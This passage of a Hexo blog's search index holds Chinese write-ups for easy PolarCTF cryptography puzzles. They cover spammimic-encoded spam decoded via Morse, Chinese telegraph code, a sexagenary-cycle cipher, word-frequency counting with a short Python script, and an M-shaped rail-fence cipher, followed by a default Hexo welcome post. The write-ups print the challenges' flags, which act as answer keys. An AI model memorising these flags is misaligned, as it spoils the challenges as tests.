convenience ! Well, now is your chance </span><br><span class="line">to capitalize on this ! WE will help YOU SELL MORE </span><br><span class="line">plus process your orders within seconds . You can begin </span><br><span class="line">at absolutely no cost to you . But don't believe us </span><br><span class="line">. Mrs Ames who resides in Maryland tried us and says </span><br><span class="line">"Now I'm rich, Rich, RICH" . We assure you that we </span><br><span class="line">operate within all applicable laws . We IMPLORE you </span><br><span class="line">- act now . Sign up a friend and your friend will be </span><br><span class="line">rich too . Thanks . Dear Web surfer ; Thank-you for </span><br><span class="line">your interest in our briefing ! If you no longer wish </span><br><span class="line">to receive our publications simply reply with a Subject: </span><br><span class="line">of "REMOVE" and you will immediately be removed from </span><br><span class="line">our mailing list . This mail is being sent in compliance </span><br><span class="line">with Senate bill 1622 ; Title 4 ; Section 309 ! This </span><br><span class="line">is not a get rich scheme . Why work for somebody else </span><br><span class="line">when you can become rich in 34 days ! Have you ever </span><br><span class="line">noticed how many people you know are on the Internet </span><br><span class="line">plus people love convenience ! Well, now is your chance </span><br><span class="line">to capitalize on this . We will help you decrease perceived </span><br><span class="line">waiting time by 150% and deliver goods right to the </span><br><span class="line">customer's doorstep . The best thing about our system </span><br><span class="line">is that it is absolutely risk free for you ! But don't </span><br><span class="line">believe us . Ms Ames of West Virginia tried us and </span><br><span class="line">says "I was skeptical but it worked for me" . We are </span><br><span class="line">a BBB member in good standing ! You will blame yourself </span><br><span class="line">forever if you don't order now ! Sign up a friend and </span><br><span class="line">you'll get a discount of 90% ! Thank-you for your serious </span><br><span class="line">consideration of our offer . Dear Sir or Madam ; Especially </span><br><span class="line">for you - this amazing info ! If you no longer wish </span><br><span class="line">to receive our publications simply reply with a Subject: </span><br><span class="line">of "REMOVE" and you will immediately be removed from </span><br><span class="line">our club . This mail is being sent in compliance with </span><br><span class="line">Senate bill 1623 , Title 5 ; Section 302 . This is </span><br><span class="line">a ligitimate business proposal ! Why work for somebody </span><br><span class="line">else when you can become rich in 97 WEEKS . Have you </span><br><span class="line">ever noticed more people than ever are surfing the </span><br><span class="line">web and people are much more likely to BUY with a credit </span><br><span class="line">card than cash . Well, now is your chance to capitalize </span><br><span class="line">on this ! We will help you deliver goods right to the </span><br><span class="line">customer's doorstep and deliver goods right to the </span><br><span class="line">customer's doorstep . You can begin at absolutely no </span><br><span class="line">cost to you . But don't believe us ! Mrs Anderson who </span><br><span class="line">resides in West Virginia tried us and says "I was skeptical </span><br><span class="line">but it worked for me" . We assure you that we operate </span><br><span class="line">within all applicable laws . You have no reason not </span><br><span class="line">to act now . Sign up a friend and your friend will </span><br><span class="line">be rich too . Best regards . Dear Friend ; We know </span><br><span class="line">you are interested in receiving cutting-edge info ! </span><br><span class="line">If you are not interested in our publications and wish </span><br><span class="line">to be removed from our lists, simply do NOT respond </span><br><span class="line">and ignore this mail . This mail is being sent in compliance </span><br><span class="line">with Senate bill 2116 ; Title 8 ; Section 302 . This </span><br><span class="line">is NOT unsolicited bulk mail . Why work for somebody </span><br><span class="line">else when you can become rich as few as 34 WEEKS . </span><br><span class="line">Have you ever noticed most everyone has a cellphone </span><br><span class="line">&amp; people are much more likely to BUY with a credit </span><br><span class="line">card than cash . Well, now is your chance to capitalize </span><br><span class="line">on this ! WE will help YOU SELL MORE and turn your </span><br><span class="line">business into an E-BUSINESS . The best thing about </span><br><span class="line">our system is that it is absolutely risk free for you </span><br><span class="line">! But don't believe us . Mrs Anderson who resides in </span><br><span class="line">Florida tried us and says "I was skeptical but it worked </span><br><span class="line">for me" . We assure you that we operate within all </span><br><span class="line">applicable laws . If not for you then for your LOVED </span><br><span class="line">ONES - act now ! Sign up a friend and you'll get a </span><br><span class="line">discount of 60% ! Thanks . Dear Salaryman , Especially </span><br><span class="line">for you - this red-hot information ! If you are not </span><br><span class="line">interested in our publications and wish to be removed </span><br><span class="line">from our lists, simply do NOT respond and ignore this </span><br><span class="line">mail . This mail is being sent in compliance with Senate </span><br><span class="line">bill 2116 , Title 8 , Section 302 ! THIS IS NOT MULTI-LEVEL </span><br><span class="line">MARKETING ! Why work for somebody else when you can </span><br><span class="line">become rich in 92 days . Have you ever noticed nearly </span><br><span class="line">every commercial on television has a .com on in it </span><br><span class="line">and nobody is getting any younger ! Well, now is your </span><br><span class="line">chance to capitalize on this ! WE will help YOU increase </span><br><span class="line">customer response by 140% and decrease perceived waiting </span><br><span class="line">time by 150% . You can begin at absolutely no cost </span><br><span class="line">to you . But don't believe us . Ms Anderson of Colorado </span><br><span class="line">tried us and says "I was skeptical but it worked for </span><br><span class="line">me" ! This offer is 100% legal ! So make yourself rich </span><br><span class="line">now by ordering immediately . Sign up a friend and </span><br><span class="line">you'll get a discount of 10% . God Bless ! </span><br></pre></td></tr></tbody></table></figure></details><p>垃圾邮件加密，工具解<a href="https://www.spammimic.com/decode.cgi">spammimic - decoded</a></p><p>得到内容</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">AABA ABAA AB BBA BBBBABB BBBBB BAAA BAAA BBBAA AABA BBBBA AAAAB AB BAAA BAA BAAA BBBBB BABA AAAAB AABA BBBBB ABBBB BAAA AABA AABBB AABBB BBBBB BAAA BBBBA BAAA BBBBB BAAAA AABA AB BAAA BBAAA BAAAA BBBBBAB</span><br></pre></td></tr></tbody></table></figure><p>培根或摩斯密码，但是培根没有空格，所以直接摩斯密码</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">果然，FLAG{0BB8F94ABDB0C4F01BF220B9B06FAB76}</span><br></pre></td></tr></tbody></table></figure><p>大写不对交小写</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{0bb8f94abdb0c4f01bf220b9b06fab76}</span><br></pre></td></tr></tbody></table></figure><h1 id="全世界都在说中国话"><a href="#全世界都在说中国话" class="headerlink" title="全世界都在说中国话"></a>全世界都在说中国话</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">663867570008258541046114143248220132000152072143</span><br><span class="line">时代在进步 中文也可以被翻译哦</span><br><span class="line">得到flag用MD532位小写加密并套上flag{}</span><br></pre></td></tr></tbody></table></figure><p>随波逐流发现中文电报码</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231224200326072.png" alt="image-20231224200326072"></p><p>直接复制MD5</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{679384ffaee1e8145a52408ac7ad6bfd}</span><br></pre></td></tr></tbody></table></figure><h1 id="天干地支"><a href="#天干地支" class="headerlink" title="天干地支"></a>天干地支</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">小李某一天收到一条微信，微信中写了几个不同的年份</span><br><span class="line">          丁丑 丙子 戊辰 壬午 丁丑 丙子 戊辰 壬午 壬辰 壬辰 辛未 丙戌</span><br><span class="line">          微信的后面还写有“+甲子”，请解出这段密文。</span><br><span class="line">flag格式：flag{XXX}</span><br></pre></td></tr></tbody></table></figure><p>天干地支表附上</p><table><thead><tr><th><strong>01 甲子</strong></th><th><strong>11 甲戌</strong></th><th><strong>21 甲申</strong></th><th><strong>31 甲午</strong></th><th><strong>41 甲辰</strong></th><th><strong>51 甲寅</strong></th></tr></thead><tbody><tr><td><strong>02 乙丑</strong></td><td><strong>12 乙亥</strong></td><td><strong>22 乙酉</strong></td><td><strong>32 乙未</strong></td><td><strong>42 乙巳</strong></td><td><strong>52 乙卯</strong></td></tr><tr><td><strong>03 丙寅</strong></td><td><strong>13 丙子</strong></td><td><strong>23 丙戌</strong></td><td><strong>33 丙申</strong></td><td><strong>43 丙午</strong></td><td><strong>53 丙辰</strong></td></tr><tr><td><strong>04 丁卯</strong></td><td><strong>14 丁丑</strong></td><td><strong>24 丁亥</strong></td><td><strong>34 丁酉</strong></td><td><strong>44 丁未</strong></td><td><strong>54 丁巳</strong></td></tr><tr><td><strong>05 戊辰</strong></td><td><strong>15 戊寅</strong></td><td><strong>25 戊子</strong></td><td><strong>35 戊戌</strong></td><td><strong>45 戊申</strong></td><td><strong>55 戊午</strong></td></tr><tr><td><strong>06 己巳</strong></td><td><strong>16 己卯</strong></td><td><strong>26 己丑</strong></td><td><strong>36 己亥</strong></td><td><strong>46 己酉</strong></td><td><strong>56 己未</strong></td></tr><tr><td><strong>07 庚午</strong></td><td><strong>17 庚辰</strong></td><td><strong>27 庚寅</strong></td><td><strong>37 庚子</strong></td><td><strong>47 庚戌</strong></td><td><strong>57 庚申</strong></td></tr><tr><td><strong>08 辛未</strong></td><td><strong>18 辛巳</strong></td><td><strong>28 辛卯</strong></td><td><strong>38 辛丑</strong></td><td><strong>48 辛亥</strong></td><td><strong>58 辛酉</strong></td></tr><tr><td><strong>09 壬申</strong></td><td><strong>19 壬午</strong></td><td><strong>29 壬辰</strong></td><td><strong>39 壬寅</strong></td><td><strong>49 壬子</strong></td><td><strong>59 壬戌</strong></td></tr><tr><td><strong>10 癸酉</strong></td><td><strong>20 癸未</strong></td><td><strong>30 癸巳</strong></td><td><strong>40 癸卯</strong></td><td><strong>50 癸丑</strong></td><td><strong>60 癸亥</strong></td></tr></tbody></table><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">14 13 05 19 14 13 05 19 29 29 08 23</span><br><span class="line"></span><br><span class="line">+甲子（一轮60）</span><br><span class="line"></span><br><span class="line">74 73 65 79 74 73 65 79 89 89 68 83</span><br></pre></td></tr></tbody></table></figure><p>ASCII转得到  JIAOJIAOYYDS</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{JIAOJIAOYYDS}</span><br></pre></td></tr></tbody></table></figure><h1 id="小星星"><a href="#小星星" class="headerlink" title="小星星"></a>小星星</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">小明暗恋小红很久了，终于在一个月黑风高的夜晚，决定约她出去数星星。小明数着数着，数出了一串数字，3，6，10，12，15，他觉得这是爱情的关键，思考了整整一晚上，小红很生气，给了他一巴掌。小明觉得就是这串数字让他失去了爱情，你还等什么呢，快来一起数数吧！</span><br><span class="line">得到的结果md5 32位小写加密一下哟！</span><br></pre></td></tr></tbody></table></figure><details><summary>点击查看</summary><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">tonightsuccessfavoritefavoritewewesuccesstonightweexamplecryptoshouldweistonightisexamplelearnwesublimlearniswordshouldwelearnfoundsublimsystemexamplesublimfoundlearnshouldmorningsublimsystemyourlearnwordcryptomorningexamplefavoritetonightlearntonightlearntonightsublimwhichyourmorningfoundtonightwewhichfoundfavoritewordcryptomorningwordislearntonightlearnsublimtonightlearnfoundwhichfoundsuccesstonightsuccessyourfoundmorningtonightwordshouldsublimwhichtonightwhichislearnexamplefavoriteexamplefoundsystemsuccesssublimsuccessshouldtonightcryptowelearncryptofoundshouldsublimsublimwewhichtonightsuccessshouldwhichwordwhichcryptoyourisshouldwhichsystemsuccesssystemwhichfoundwhichlearnexampletonightfavoritemorningyourtonightlearnmorningtonightfoundfoundsuccessfavoritesystemwhichlearnexampleisshouldcryptocryptosublimweexampletonightwordshouldwordmorningislearntonightsystemsuccesssuccessismorningfavoriteyourfoundfoundtonightmorningwhichwhichwordfoundislearnwhichwhichshouldwordsystemfoundyourlearnlearnsystemfavoritetonightwordshouldlearnyourisweyourfavoriteshouldwordwefoundsystemwecryptocryptowewordissystemwhichshouldtonightsystemfavoritemorningsystemwewhichmorningfoundsuccessyourtonightsuccesstonightisshouldwewhichwordwesystemyourfavoritesystemwordlearnexamplelearnfoundlearnfavoriteexamplesystemwordcryptocryptolearnsystemwordcryptowhichlearnexamplemorningmorningwewhichwhichsuccessexampleyourwordisfavoritesublimwhichissuccessiswordsublimexamplesystemwordexamplecryptolearnyourexamplelearnsystemyoursuccesswhichwhichsuccesswordyourislearnsuccessiswordsublimshouldweisexamplesuccesssuccesstonightweyourshouldsuccessmorningcryptomorningfoundissublimshouldwhichshouldfavoritesuccessmorningsuccessexamplelearnshouldsublimlearntonightshouldyourissublimlearncryptosuccesswhichfavoritetonightmorningtonightwesuccessweyourisexamplewesystemfavoritemorningsystemmorningcryptolearnsystemwordwordfoundcryptoyourlearnyoursystemwemorningwhichexampleshouldlearncryptofoundwhichislearnwhichwhichisshouldiswordshouldwordsystemshouldshouldsuccessmorningwordfoundsystemwhichsystemtonightcryptowelearnexampleexamplesystemwhichisshouldwordwhichsublimtonightfoundfoundsuccesssuccesssystemsublimcryptoshouldwhichsublimmorninglearnfoundtonightcryptoissuccesscryptoweisfoundshouldfavoriteshouldmorningfavoritesystemcryptosystemlearnsystemfavoritemorningsystemwhichwemorninglearnsuccessfoundwesuccesswewordyourcryptoyourfavoriteissuccessshouldtonightmorningwhichmorningyourwhichfavoritefoundmorningwetonightsystemwordcryptotonightcryptosystemyourwordfoundexampletonightyoursystemcryptosublimmorningyourwordfoundisshouldsuccesscryptotonightsystemfavoriteisyourshouldwhichwordcryptomorningwesublimfavoritesuccessfavoriteyoursuccesstonightlearnweyourwhichfoundyourexampleshouldshouldtonightwelearnwordfavoritewordwefoundmorningexampleshouldexamplewordsuccessfavoritewhichfoundwordcryptofavoriteyourlearnyourwewhichfoundmorningsystemweexamplefavoritewordisexamplesublimwordyourmorningtonightwordsuccesscryptosuccessyoursuccesstonighttonightwelearnwhichwhichwordmorningwhichsystemcryptoismorningsystemexamplecryptoyourexamplelearnsublimsuccessyoursystemfoundmorningshouldcryptotonightsublimwordexamplemorningsystemyourexampleweexamplefavoritesuccesssublimfavoritecryptoshouldisshouldwordtonightfoundsublimisistonightshouldissuccesstonightissuccessmorningsystemcryptoiswhichtonighttonightfavoritelearnshouldyourfoundexamplesystemwordsuccessweyourtonightcryptoyourfavoritewhichfavoriteisyoursystemfoundyourfavoriteshouldlearnyourfoundexampleyourmorningshouldsuccessmorningmorningexampleexamplefoundsublimfoundwhichisfavoritelearnfoundmorningcryptofavoritecryptoshouldweshouldtonightcryptoissublimcryptosublimwhichwhichsublimwhichcryptofavoritewordwordsublimexamplewhichwhichshouldlearncryptowhichshouldmorninglearnfavoriteyourexamplesublimtonightshouldfoundtonightsuccessshouldmorningfoundwordweyourlearnsublimsystemiscryptowordyourtonightcryptosublimmorningmorningexamplefavoritewordwhichlearnshouldmorningsublimfoundtonightsublimsublimexamplefoundyourexamplewordfoundwemorningfavoritefoundcryptosuccesssublimsublimexamplewordsuccessexamplefavoritesuccessissublimlearnyourexamplesuccesssuccesssystemsuccessmorningmorninglearnexamplemorningtonightfoundiswhichfavoritemorningwhichsuccessmorningyourmorningislearncryptowhichyourwhichyourwordtonighttonightsuccesslearnwhichfoundsuccesssystemfoundiswhichlearnsystemsublimcryptowhichmorningwetonightshouldlearnwhichfoundcryptofavoritelearnlearnshouldfoundsuccessexampletonightwordsuccessfoundyourtonightwhichfoundsuccessshouldmorningyourfavoritemorningsystemsystemsuccessshouldwelearnwhichfoundexamplewewordfoundweshouldsystemsystemmorningmorningisshouldwhichsublimwhichtonightsuccesssystemsystemcryptoyourshouldsublimfoundwetonightfavoriteexamplewewesuccessfoundyourtonightfoundsystemexamplecryptofoundshouldshouldsuccesswhichisexampletonightwordlearnfavoriteyourlearnsystemsublimfoundlearnsuccesssystemshouldsublimfavoritelearnsystemfavoritetonightexamplefoundyourfavoritewhichlearnfavoritecryptoyoursystemmorningwordwesystemfoundfoundshouldsystemwhichwhichissystemsublimcryptoyourmorninglearnlearntonightsublimlearnwhichwhichissystemyouryourcryptowhichshouldwordyoursublimfavoriteexamplemorningexamplesublimsublimissystemexampleshouldsublimlearnfoundwhichislearnmorningmorningfoundwordtonightmorningfavoritewhichlearnyoursystemtonightisexamplelearntonightisweshouldcryptosuccessisexamplesuccesswordshouldmorningyourislearnwordwordshouldcryptocryptotonightiscryptocryptoisisfavoriteyourtonightwhichmorningfoundwewhichexamplewhichfoundyoursublimsystemwordexampleexamplesystemsuccessyoursublimwhichmorningissystemfoundlearnsystemshouldsublimsublimwhichshouldwordyourshouldexampleexampleshouldsuccesswelearnfoundsublimshouldyourwewhichtonightwefavoritesublimsystemlearnshouldfoundsuccessyourwhichsuccessmorningcryptowhichyourfoundexampletonightlearnexampleexamplefoundlearnsuccesssystemiscryptofavoritewordfoundislearncryptowordlearnlearnexamplesuccessfavoritefavoritesystemmorningcryptotonightfavoritefavoritewhichsuccesscryptowhichissublimexamplewhichfoundtonightcryptotonightsublimfavoritesuccesssublimwordwhichtonightwordshouldwordfoundsystemtonightyourissuccessshouldweisfavoriteisisfavoritewecryptoisisyourtonightlearnsuccessmorningyourtonightsuccessshouldiscryptowhichwhichshouldsublimsystemexamplemorningcryptofavoritewordsuccesswordisfavoritelearnsublimlearnsuccesscryptowordsuccesswhichfavoritecryptosystemsublimsuccessweisyourwhichlearnyourwewemorningsuccesslearncryptoiswecryptosystemlearnwhichwhichyourexamplefoundsystemcryptoyourfavoritefoundyoursublimiswesublimfavoritemorningshouldexamplefavoritecryptoshouldtonightmorningwordfoundsystemwhichwhichsystemwordcryptoissublimlearnsuccessmorningsublimsystemcryptoyoursublimwesuccessmorningsublimiscryptoissublimwordlearnsuccesssublimlearncryptoweweexamplecryptowefavoritelearnfoundissystemsystemexampleshouldlearnsuccesssublimcryptoistonightismorningmorningfavoriteshouldfavoritefoundwordwordshouldwordshouldfoundfoundcryptosuccessissuccessshouldwewhichfavoriteweweshouldmorningfoundyoursuccessiswefavoriteyoursuccesswhichwhichexamplelearnfoundwetonightyourcryptowordsublimsublimtonightsuccesslearnistonightwhichtonightwordsublimfavoritewefoundcryptoiswhichwhichlearnlearntonightexamplesystemwhichsublimfavoritecryptoshouldyouryourisyourwesublimmorningwesystemshouldtonightwordyourshouldfavoritefoundyourfavoritewhichsublimwewordwefoundfoundlearnfoundwecryptosystemexamplemorningcryptocryptosublimwordexamplefavoritefoundlearnwelearnmorningwordwhichwordsystemsublimtonightsuccesssystemlearnshouldwhichiswhichsuccesssuccessisexamplefavoritewhichshouldsublimlearniswordshouldexamplelearnsystemyoursublimisissuccesswelearntonightexamplewecryptowhichwesystemsystemsublimexamplecryptolearnmorningsublimfoundsublimfoundisfoundtonighttonightfavoritesuccesssuccessexampleyoursuccesstonightsublimcryptosystemwewhichexamplesystemwordwordfavoritesublimtonightisfavoritesystemexamplewordsuccesstonightmorningsuccesstonightwefavoritesublimtonightwelearntonightmorningsublimiswhichwordtonightwhichwecryptofoundwordwhichfavoriteissuccesswesystemyourexampleiswhichsuccesstonightsublimwemorningsuccesssuccesswesublimsuccessfavoritesublimfoundlearnlearnweexamplecryptofavoritelearnweyourshouldyourfoundcryptolearnfoundmorningtonightmorningmorningfavoritewecryptowewesuccessfoundsublimweyourwhichshouldshouldshouldsublimistonightwhichwesublimsuccessshouldfoundwordwordtonightwecryptowewhichfoundcryptoshouldcryptoyouryourfoundwhichsublimsublimwordlearnwordshouldfavoriteisfoundsuccessshouldtonightwhichmorningsystemmorningtonightwefavoritelearnisexampleyourshouldfavoritesublimsublimexamplewordsuccessfavoritesystemmorningfavoritecryptosystemsublimcryptosystemsuccessshouldmorningisshouldmorninglearnfavoritefavoriteshouldwordwewesublimsublimfavoriteyoursuccesswhichsystemfoundshouldshouldcryptoisyourmorningsystemshouldshouldtonightwesublimyourfoundlearniswordtonightmorningexampleyourwordfoundisshouldtonightcryptocryptofoundyourexamplefavoritecryptoyourfavoritewordfavoriteshouldweshouldfoundwemorningcryptosuccesslearnfoundtonightsublimfavoritefavoritewefoundwewesuccesssublimsublimcryptoweexampletonightsuccessfoundshouldsuccesstonightissystemshouldwesystemfavoriteisyoursystemiswefavoritelearnfavoritefavoritesuccesslearntonightyourlearnsuccessissuccesswesystemyourcryptofavoritewordsystemyourfavoritewewordsuccessweshouldfoundshouldcryptomorningtonightwewordwesuccesslearnwordshouldweexampletonightsuccessfavoritefavoritemorningfoundmorningfoundyoursublimsystemsuccessissuccessmorningyourwordfoundweexamplemorningsublimlearnfoundfoundfavoritemorningshouldweyourwemorningexamplesuccesssuccessfoundwordwordshouldweyourshouldwordshouldexamplefavoritefoundsuccesssystemfoundshouldsublimistonightshouldsystemtonightsuccesslearntonightsystemsublimsuccesscryptoissystemsublimmorningmorningshouldmorninglearnsuccesslearnmorningyourmorninglearnexamplecryptoshouldissublimshouldfoundissystemsystemweexamplesystemtonightsublimmorningmorningyourfoundcryptolearnisshouldisfavoritesublimfoundwordcryptoyourshouldsuccesssystemsuccessshouldsystemissublimshouldsublimsystemisexampleshouldissublimfavoritelearnsublimyourisyoursublimsuccesssublimyouryourfavoriteshouldsuccessfavoritefavoritelearnexamplesystemweexamplesublimisiscryptoshouldyourcryptosublimissublimshouldsystemfavoritefavoritewordsuccesssuccesslearnsystemsublimwefavoritelearnyoursublimsystemyourfavoriteyourwordsuccesslearnwelearnwefavoritecryptolearncryptofavoritefavoriteiscryptowordcryptoyourcryptoissuccesslearnwordsystemsuccesswordsystemsystemcryptosuccessissublimlearnsublimcryptoislearnsublimyoursublimexamplecryptosublimsystemfavoritecryptocryptoyourwordyourfavoriteisfavoritefavoritewordcryptocryptosystemissublimiscryptocryptoissystemyourwordfavoritesystemsystemsystemyourfavoritewordcryptoyouryoursystemwordyourcryptoexamplefavoritecryptoexamplefavoritewordexampleexamplewordcryptowordyourfavoritewordexampleexamplecryptowordexampleexamplewordfavoritewordcryptocryptoexamplewordexamplecryptocryptowordfavoriteexamplecryptofavoritewordexampleexampleexamplecryptocryptoexampleexamplewordfavoritewordcryptowordwordwordwordwordwordexampleexamplewordwordexamplewordexamplewordexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexampleexample</span><br></pre></td></tr></tbody></table></figure></details><p>发现单词重复率很高，想到词频统计，上脚本</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">"1.txt"</span>,<span class="string">'r'</span>)</span><br><span class="line">data=f.read()</span><br><span class="line"></span><br><span class="line">statistics={} <span class="comment">#句子</span></span><br><span class="line">frequency=[] <span class="comment">#频率</span></span><br><span class="line">num=[“<span class="number">3</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">12</span>,<span class="number">15</span>]</span><br><span class="line">”<span class="keyword">def</span> <span class="title function_">zipin</span>(<span class="params">lsit</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lsit:</span><br><span class="line">        statistics.setdefault(data.count(i),<span class="built_in">str</span>(i))</span><br><span class="line">        frequency.append(data.count(i))</span><br><span class="line">    frequency.sort()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">''</span>.join(statistics.get(frequency[i-<span class="number">1</span>])),end=<span class="string">''</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">return</span>(statistics)</span><br><span class="line"><span class="comment">#下面letters里是附件里的所有出现的单词。</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    letters=[<span class="string">"tonight"</span>,<span class="string">"success"</span>,<span class="string">"favorite"</span>,<span class="string">"example"</span>,<span class="string">"should"</span>,<span class="string">"crypto"</span>,<span class="string">"is"</span>,<span class="string">"learn"</span>,<span class="string">"found"</span>,<span class="string">"morning"</span>,<span class="string">"we"</span>,<span class="string">"system"</span>,<span class="string">"sublim"</span>,<span class="string">"your"</span>,<span class="string">"which"</span>,<span class="string">"word"</span>]</span><br><span class="line">    <span class="built_in">print</span>(zipin(letters))</span><br><span class="line">按词频顺序取 <span class="string">"3,6,10,12,15"</span> ,排列</span><br><span class="line"><span class="comment"># whichisyourfavoriteword</span></span><br><span class="line"><span class="comment"># {117: 'tonight', 138: 'success', 136: 'favorite', 139: 'example', 131: 'should', 141: 'crypto', 129: 'is', 134: 'learn', 125: 'found', 113: 'morning', 124: 'we', 130: 'system', 132: 'sublim', 133: 'your', 120: 'which', 140: 'word'}</span></span><br></pre></td></tr></tbody></table></figure><p>flag{17c5d0278edcbad3d061a92b723c116d}</p><h1 id="神秘组织M"><a href="#神秘组织M" class="headerlink" title="神秘组织M"></a>神秘组织M</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">这个组织是由5个人创建起来的！！！</span><br><span class="line">{bc1bg572ec066}a0d2fb137l951b5451f06b7</span><br></pre></td></tr></tbody></table></figure><p>尝试了凯撒，栅栏都没有解决，</p><p>查资料发现一个叫M型栅栏的怪东西（见过标准型和w型，又来个M）</p><p><a href="https://blog.csdn.net/m0_63253319/article/details/133792943">【PolarCTF】你知道M型栅栏密码吗？-CSDN博客</a></p><p>找不到什么在线工具，参考W手动</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">     {          b          c          1          b</span><br><span class="line">    g  5       7  2       e  c       0 6       6   }</span><br><span class="line">   a    0     d    2     f    b     1   3     7  </span><br><span class="line">  l      9   5      1   b      5   4     5   1  </span><br><span class="line">f         0           6          b         7 </span><br></pre></td></tr></tbody></table></figure><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{50905d7b2216bfeccb5b41016357176b}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/12/26/hello-world/"/>
      <url>/2023/12/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"text"</span></span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
